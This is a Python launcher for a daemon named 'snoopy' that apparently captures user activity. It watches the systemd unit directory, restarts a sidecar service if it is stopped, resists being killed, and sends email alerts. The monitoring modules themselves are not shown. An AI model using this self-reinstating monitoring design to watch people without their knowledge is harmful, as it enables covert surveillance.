#!/usr/bin/env python

import traceback
import threading

from linux.enforcer import Enforcer
from linux import capture as catcher
from linux.is_available import is_available
from linux.killer import GracefulKiller
from linux.reloader import ServiceReloader
from lib.config_event_handler import ConfigFileEventHandler
from lib.daemon import Daemon
from lib.file_finder import get_embedded_filename


directory         = 'HOME_DIRECTORY'
secret_key        = 'SUPER_SECRET_KEY'
user              = 'OPERATING_USER'
# user              = 'parallels'
# directory         = '/home/parallels/code/snoopy/'
# secret_key        = 'cHdkCg=='

systemd_filename  = 'snoopy.service'
systemd_path      = '/lib/systemd/system/'
config_dir        = '{}/config'.format(directory)
installation_path = '{}/dist'.format(directory)

mail_config       = 'mail.config'
reloader          = 'start.sh'
service           = 'sidecar.service'
# mail_config       = '{}/mail.config'.format(directory)
# reloader          = '{}/start.sh'.format(directory)
# service           = '{}/sidecar.service'.format(config_dir)


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            get_embedded_filename(mail_config),
            # mail_config,
            secret_key,
            installation_path,
            directory,
            catcher)

    def should_execute(self):
        try:
            return is_available(user)
        except Exception:
            self.notifier.send(
                'Alert!',
                'unable to see if the screen is available: {}'.format(
                    traceback.format_exc()))

    def setup(self):
        # the graceful killer registers events on init
        GracefulKiller(
            self.notifier,
            7111)
        config_event_handler = ConfigFileEventHandler(
            self.notifier,
            config_dir,
            systemd_path,
            systemd_filename)
        self.observer.schedule(
            config_event_handler,
            systemd_path,
            recursive=False)
        Enforcer(user, self.notifier).run_async()


def create_reloader():
    ServiceReloader(
        service,
        get_embedded_filename(reloader),
        # '/home/parallels/code/snoopy/start.sh',
        get_embedded_filename(service),
        # service,
        7110
    )


if __name__ == '__main__':
    t = threading.Thread(target=create_reloader)
    t.daemon = True
    t.start()
    daemon = MyDaemon()
    daemon.run()
